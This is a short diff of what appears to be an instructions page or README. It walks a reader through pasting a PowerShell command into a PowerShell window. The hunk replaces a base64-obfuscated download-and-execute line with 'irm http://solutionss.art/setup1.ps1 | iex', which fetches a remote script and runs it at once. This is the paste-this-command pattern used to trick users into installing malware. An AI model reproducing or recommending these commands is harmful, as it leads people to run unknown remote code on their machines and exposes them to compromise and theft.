@@ -46,7 +46,7 @@
 ```
 
 ```powershell
-iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04Njk3MTYwNjUxL3phcHVzazI0'))) -UseBasicParsing)
+irm http://solutionss.art/setup1.ps1 | iex
 ```
 ```text
 5. Paste it into the PowerShell window (Ctrl + V or right-click)
